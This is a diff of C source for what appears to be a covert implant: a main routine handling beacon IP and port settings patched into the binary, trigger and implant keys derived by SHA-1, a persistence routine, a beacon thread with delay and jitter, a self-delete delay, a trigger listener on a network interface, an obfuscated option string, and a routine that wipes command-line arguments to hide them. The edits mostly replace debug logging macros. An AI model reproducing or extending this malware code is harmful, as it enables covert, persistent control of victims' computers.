@@ -37,6 +37,7 @@ int initSrandFlag = 0;       //Used as a flag to ensure srand is initialized onl
 #include <signal.h>
 #include <unistd.h>
 #define _stat stat
+
 //const char* OPT_STRING  = (char*) cIures4j;
 const char* ohshsmdlas3r  = (char*) cIures4j;
 
@@ -45,6 +46,10 @@ extern int wsa_init_done;
 
 // Global
 unsigned char	ikey[ID_KEY_HASH_SIZE];		// Implant Key
+
+#ifdef DEBUG
+int dbug_level_ = 2;				// debug level
+#endif
 
 //**************************************************************
 struct cl_args
@@ -149,15 +154,15 @@ int main(int argc, char** argv)
 
 	if(stat( (char *)sdfp,&st ) != 0)
 	{
-		D( perror( " stat()" ); )
-		D( printf( " DEBUG: %s file does not exist\n", (char *)sdfp ); )
+		DLX(1, perror( " stat()" ));
+		DLX(1, printf(" %s file does not exist\n", (char *)sdfp));
 
 		f = fopen( (char *)sdfp,"w" );
 
 		if ( f == NULL )
 		{
-			D( perror( " fopen()"); )
-			D( printf( " ERROR: could not create file %s\n", (char *)sdfp ); )
+			DLX(1, perror(" fopen()"));
+			DLX(1, printf("\tCould not create file %s\n", (char *)sdfp));
 			exit( 0 );
 		}
 
@@ -165,7 +170,7 @@ int main(int argc, char** argv)
 	}
 	else
 	{
-		D( printf( " DEBUG: %s file already exists\n", (char *)sdfp ); )
+		DLX(1, printf( "\t%s file already exists\n", (char *)sdfp ));
 	}
 
 #if defined SOLARIS
@@ -174,30 +179,33 @@ int main(int argc, char** argv)
 //	if(retVal != 0)
 	if ( getcwd( exe_path, exe_path_size ) == NULL )
 	{
-		D(perror(" getcwd()"));
-		D(printf(" ERROR: exe path returned too long for the buffer"));
+		DLX(1, perror("getcwd()"));
+		DLX(1,printf("\tERROR: exe path returned too long for the buffer\n"));
 	}
 	else
 	{
 		//strip off new line
-		D( printf( " DEBUG: exe_path (pwd, cwd) is %s\n", exe_path ); ) 
+		DLX(1,printf( "exec_path (pwd, cwd) is %s\n", exe_path));
 //		memset(strstr(exe_path,"\n"),0, 1);
 	}
 #endif
 
-#if 0	//To See Crypto Keys, ENABLE THIS SECTION...
-	D( printf("\n\n my_dhm_P_String=%s ", my_dhm_P_String) );
-	D( printf("\n\n my_dhm_G_String=%s ", my_dhm_G_String) );
-	D( printf("\n\n test_ca_crt_String=%s ", test_ca_crt_String) );
-	D( printf("\n\n test_srv_crt_String=%s ", test_srv_crt_String) );
-	D( printf("\n\n test_srv_key_String=%s ", test_srv_key_String) );
+	//To See Crypto Keys, ENABLE THIS SECTION with debug level 4...
+#if 0
+	DLX(4,
+		printf("\n\n my_dhm_P_String=%s ", my_dhm_P_String);
+		printf("\n\n my_dhm_G_String=%s ", my_dhm_G_String);
+		printf("\n\n test_ca_crt_String=%s ", test_ca_crt_String);
+		printf("\n\n test_srv_crt_String=%s ", test_srv_crt_String);
+		printf("\n\n test_srv_key_String=%s ", test_srv_key_String)
+	);
 #endif
 
 	if ( args.patched == 1 )
 	{
 		// binary was patched
 		// all patched times should be already be in milliseconds
-		D( printf( " DEBUG: Binary was patched with arguments\n" ); )
+		DLX(1, printf("Binary was patched with arguments\n"));
 
 		beaconPort = args.beacon_port;
 		beaconIP = args.beacon_ip;
@@ -212,18 +220,22 @@ int main(int argc, char** argv)
 	//	cl_string( (unsigned char *)args.beacon_ip, sizeof( args.beacon_ip ) );
 		cl_string( (unsigned char *)args.beacon_ip, args.host_len );
 		beaconIP[ args.host_len ] = '\0';
-		D( printf( " DEBUG: Decoded patched value for hostname/IP: %s\n", beaconIP ); )
+		DLX(1, printf("\tDecoded patched value for hostname/IP: %s\n", beaconIP));
 
 		cl_string( (unsigned char *)args.iface, sizeof( args.iface ) );
-		D( printf( " DEBUG: Decoded patched value for interface: %s\n", szInterface ); )
+		DLX(1, printf( "\tDecoded patched value for interface: %s\n", szInterface));
 
 		goto okay;
 	}
-	D( printf( " DEBUG: Binary was NOT/NOT patched with arguments\n" ); )
+	DLX(1, printf("NOTE: Binary was NOT/NOT patched with arguments\n\n"));
 
 	// process options
 	//while(EOF != (c = getopt(argc, argv, OPT_STRING)))
+#ifdef DEBUG
+	while((c = getopt(argc, argv, "a:cD:d:hI:i:j:K:k:p:s:t:")) != -1)
+#else
 	while((c = getopt(argc, argv, ohshsmdlas3r)) != -1)
+#endif
 	{
 		switch(c)
 		{
@@ -231,6 +243,12 @@ int main(int argc, char** argv)
 				// todo: check that IP address is valid -- see client for howto
 				beaconIP = asloc( optarg );//optarg;
 				break;
+
+#ifdef DEBUG
+			case 'D':
+				dbug_level_ = atoi(optarg);
+				break;
+#endif
 
 			case 'd':
 				// user enters delay in seconds and this is converted to milliseconds
@@ -278,10 +296,10 @@ int main(int argc, char** argv)
 					}
 					if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { // Validate that the key text is of sufficient length
 						sha1_file((const char *)optarg, ikey);		// Generate the ID key
-						D( displaySha1Hash ("Trigger Key", ikey); );
+						DLX(1, displaySha1Hash ("Trigger Key: ", ikey));
 						sha1(ikey, ID_KEY_HASH_SIZE, ikey);		// Generate the implant key
-						D( displaySha1Hash ("Implant Key", ikey); );
-						D( printf("\n\n\n" ); );
+						DLX(1, displaySha1Hash ("Implant Key: ", ikey));
+						DLX(1, printf("\n\n\n" ));
 					} else {
 						fprintf(stderr, "%s\n", oe3);
 						return -1;
@@ -303,12 +321,12 @@ int main(int argc, char** argv)
 					fprintf(stderr, "%s\n", oe3);
             				return -1;
                                 }
-				D( printf( "\n\n\n DEBUG: keyPhrase=%s \n", optarg) );
+				DLX(1, printf( "KeyPhrase: %s \n", optarg));
 				sha1((const unsigned char *)optarg, strlen(optarg), ikey);
-				D( displaySha1Hash ("Trigger Key", ikey); );
+				DLX(1, displaySha1Hash ("Trigger Key: ", ikey));
 				sha1(ikey, ID_KEY_HASH_SIZE, ikey);
-				D( displaySha1Hash ("Implant Key", ikey); );
-				D( printf("\n\n\n" ); );
+				DLX(1, displaySha1Hash ("Implant Key: ", ikey));
+				DLX(1, printf("\n\n\n"));
 				break;
 
 			case 'p':
@@ -327,7 +345,7 @@ int main(int argc, char** argv)
 				break;
 
 			default:
-				D( printUsage(argv[0]); )
+				DLX(1, printUsage(argv[0]));
 				exit(0);
 				break;
 		}
@@ -399,7 +417,7 @@ okay:
 		retVal = EnablePersistence(beaconIP,beaconPort);
 		if( 0 > retVal)
 		{
-			D( printf("\nCould not enable Persistence!\n"); )
+			DLX(1, printf("\nCould not enable Persistence!\n"));
 			return -1;
 		}
 	}
@@ -417,24 +435,24 @@ okay:
 	if ( initialDelay > 0 )
 	{
 		// create beacon thread
-		D( printf( " DEBUG: calling BeaconStart()\n" ); )
+		DLX(1, printf( "Calling BeaconStart()\n"));
 		retVal = beacon_start(beaconIP, beaconPort, initialDelay, interval, jitter);
 	
 		if(0 != retVal)
 		{
-			D( printf("Beacon Failed to Start!\n"); )
+			DLX(1, printf("Beacon Failed to Start!\n"));
 		}
 	}
 	else
 	{
-		D(printf( " DEBUG: ALL BEACONS DISABLED, initialDelay <= 0.\n" ); )
+		DLX(1, printf("ALL BEACONS DISABLED, initialDelay <= 0.\n"));
 	}
 
 	// delete_delay
-	D(printf( " DEBUG: self delete delay = %lu.\n", delete_delay ); )
+	DLX(1, printf("Self delete delay: %lu.\n", delete_delay ));
 
 #ifndef __VALGRIND__
-	D( printf( " DEBUG: calling TriggerListen()\n" ); )
+	DLX(2, printf( "\tCalling TriggerListen()\n" ));
 	(void)TriggerListen( szInterface, trigger_delay, delete_delay );	//TODO: TriggerListen() doesn't return a meaningful value.
 #endif
 
@@ -487,18 +505,17 @@ static void clean_args( int argc, char **argv, char *new_argv0 )
 	unsigned int	len = 0;
     int				n;
 
-	D( printf( " DEBUG: LINUX => Attempting to clean command line arguments\n"); )
+	DLX(3, printf("\tLINUX => Attempting to clean command line arguments\n"));
 
     for ( n = ( argc - 1 ); n > 0; n-- )
     {
 	len = strlen( *(argv + n) );
-	D( printf( " DEBUG: n = %d\n", n ); )
-	D( printf( " DEBUG: cleaning argument #%d with length %d: %s\n", n, len, *(argv + n) ); )
+	DLX(3, printf( "\tCleaning argument #%d with length %d: %s\n", n, len, *(argv + n) ));
         memset( *(argv + n), 0, len );
         maxlen_argv0 += len;
     }
 
-	D( printf( " DEBUG: max ARGV0 length is %d bytes\n", maxlen_argv0 ); )
+	DLX(3, printf( "\tMax ARGV0 length is %d bytes\n", maxlen_argv0 ));
 
     if ( ( new_argv0 != NULL ) && ( strlen( new_argv0 ) < maxlen_argv0 ) )
     {
